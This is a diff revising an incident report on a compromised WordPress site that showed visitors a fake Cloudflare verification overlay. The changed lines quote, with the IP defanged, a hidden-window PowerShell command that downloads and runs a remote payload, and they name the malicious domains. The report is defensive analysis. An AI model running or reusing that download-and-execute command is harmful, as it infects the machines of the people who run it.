@@ -2,7 +2,7 @@
 *7 Sept 2025, K. Tonkin*
 
 ## Executive Summary
-On September 5, 2025, the Breakers FWB website ```(https://www.breakersfwb.com)``` was discovered to be compromised. Malicious JavaScript was injected into the site, redirecting visitors to a fake Cloudflare “verification” page hosted on ```getfix.win```. The fraudulent verification page attempted to trick users into executing a PowerShell command that would download further payloads from ```155.94.155.25```. The site directed the user to verify by pressing Win+R and Ctrl+V to paste ```powershell -w h -nop -c iex(iwr -Uri 155[.]94[.]155[.]25 -UseBasicParsing)``` copied to their clipboard.
+On September 5, 2025, the Breakers FWB website ```(https://www.breakersfwb.com)``` was discovered to be compromised. Malicious JavaScript was injected into the site, in which visitors had a fake Cloudflare “verification” page overlaid on top of the actual website, which was hosted on ```ncloud.icu``` and dynamically loaded via a `<iframe>`. The fraudulent verification page attempted to trick users into executing a PowerShell command that would download further payloads from ```155.94.155.25```. The site directed the user to verify by pressing Win+R and Ctrl+V to paste ```powershell -w h -nop -c iex(iwr -Uri 155[.]94[.]155[.]25 -UseBasicParsing)``` copied to their clipboard.
 
 Investigation showed evidence of:
 - Injected code** calling external malicious domains (```getfix.win```, ```ncloud.icu```).  
@@ -104,7 +104,7 @@ During investigation, several WordPress accounts were discovered that appear lin
 The Breakers FWB website compromise appears to be the result of WordPress plugin exploitation leading to malicious script injection. Once access was obtained, the attackers combined two tactics:
 
 1. Traffic generation via SEO spam – Unrelated “casino/gambling” blog posts were created, likely to boost search visibility and attract users who are statistically more prone to clicking such links. This increases site traffic and funnels more victims into the malicious redirection chain.  
-2. Malware delivery via injected scripts – Visitors were silently redirected to a fake Cloudflare “verification” page (```getfix.win```), where they were tricked into executing a PowerShell command that downloaded further payloads from ```155.94.155.25```.  
+2. Malware delivery via injected scripts – Visitors to this website had a fake Cloudflare “verification” page overlaid on top of the actual website (```getfix.win```), where they were tricked into executing a PowerShell command that downloaded further payloads from ```155.94.155.25```.  
 
 This indicates the attackers were not simply defacing the site but using it as a **malicious distribution platform**: leveraging The Breakers’ reputation and Google indexing to drive unsuspecting users into a malware infection flow.  
 
